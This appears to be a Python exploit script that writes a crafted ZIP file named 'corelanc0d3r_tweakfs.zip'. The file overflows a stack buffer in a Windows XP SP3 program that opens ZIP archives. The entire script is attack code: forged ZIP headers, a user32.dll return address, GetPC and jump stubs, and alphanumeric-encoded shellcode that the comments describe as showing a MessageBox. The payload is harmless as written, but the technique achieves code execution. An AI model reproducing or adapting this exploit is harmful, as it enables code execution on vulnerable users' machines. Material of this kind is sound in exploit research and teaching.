ldf_header = ("\x50\x4B\x03\x04\x14\x00\x00\x00\x00\x00\xB7\xAC\xCE\x34\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00"
"\xe4\x0f"
"\x00\x00\x00")
 
cdf_header = ("\x50\x4B\x01\x02\x14\x00\x14\x00\x00\x00\x00\x00\xB7\xAC\xCE\x34\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\xe4\x0f"
"\x00\x00\x00\x00\x00\x00\x01\x00"
"\x24\x00\x00\x00\x00\x00\x00\x00")
 
eofcdf_header = ("\x50\x4B\x05\x06\x00\x00\x00\x00\x01\x00\x01\x00"
"\x12\x10\x00\x00"
"\x02\x10\x00\x00"
"\x00\x00")
 
#egg esi, will jump to edi
egg = "VYIIIIIIIIIIIIIIII7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJI"
egg += "avMQzjioDOW2PRqzERCh8MVNGLC51J0tJOLxpwDptpQdlKXzloaeKZnO45IwkOM7A"
getpc="\x89\x05\x5e\x98\x99\x46\x46\x8a\x94\x98\x98\x98"
getpc += "\x74\x07\x46\x46\x49\x73\x97"  #loop
getpc += "\x77\x85"  #jump before getpc
getpc += "\x46\x41\x41\x41"  #nops
nop="\x42\x42\x33\x90\x41\x41\x41\x41\x41\x41"   #nops + prepare loop
size=272
 
ret = "\x7C\x22\x48\x7E"  #  0x7E48227C user32.dll XP SP3
buff = "\x41" * (125-len(nop))
buff += nop + getpc + egg + "\x77\x9F"  #jmp between getpc and egg
buff += "\x41" * (size-len(buff))
buff += ret
buff += "\x41\x77\xA4\x42"   #jump back
buff += "\x3c\x44\x40\x00" # null byte to avoid writing over end of stack (no SEH)
buff += "w00tw00t"
#edi basereg - MessageBox shellcode
buff += "WYIIIIIIIIIIIIIIII7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJIyIHkmKzyt4utzTt"
buff += "qXRmbBZFQhIRDnkqavPLKqfdLNkrV7lNk1VwxLKSNQ0NkDvTxpOdXrUl3SiVa8QyoM1"
buff += "1pNkRLwTDdlKQUwLnksdS5d8Wq8jnkQZwhLKQJq05QjKM3egQYnkVTLK31JNUaIoVQY"
buff += "PKLNLK4O0cDfjKq8OVmUQIWyyHqKOYokOUkalgTdhSEyNnkBz5tVaJK2FNkTLPKLKrz"
buff += "GlUQZKNkUTNkUQzHnipDwTUL3QKsoBwx5yXTNixeMYhBSXNnpNVnxlbrYxOlKOkOKOK"
buff += "9qUwtMk3NxXM2rSNgWlgT2rixlKkOkOYoK9pEeXqx2LrLupYo58wC026Natph0u2SSU"
buff += "proxSlWTDJLIXfrvkORuWtoyhBRpMkMxLbrmOLMWgl14v2yxcnkOKOKOaxRlQQrnQHQ"
buff += "xBc2orrsutqKkMXQLq4uWMYKSsXprV8gPupPhpcFPsTecQxu5bLaq0nCXEpqs0oBR1x"
buff += "cTepqrRY3XPopwbNSUvQ9Yk8pLWTWeMYyqdqzrBrV3saPRyozpTqo0rpKO1EUXA"
buff += "\x43" * (4064-len(buff)) # 4064
buff += ".txt"
 
 
print " [+] Writing payload to file corelanc0d3r_tweakfs.zip"
mefile = open('corelanc0d3r_tweakfs.zip','w');
mefile.write(ldf_header + buff + cdf_header + buff + eofcdf_header);
mefile.close()
print " [+] Wrote " + str(len(buff))+ " bytes to file"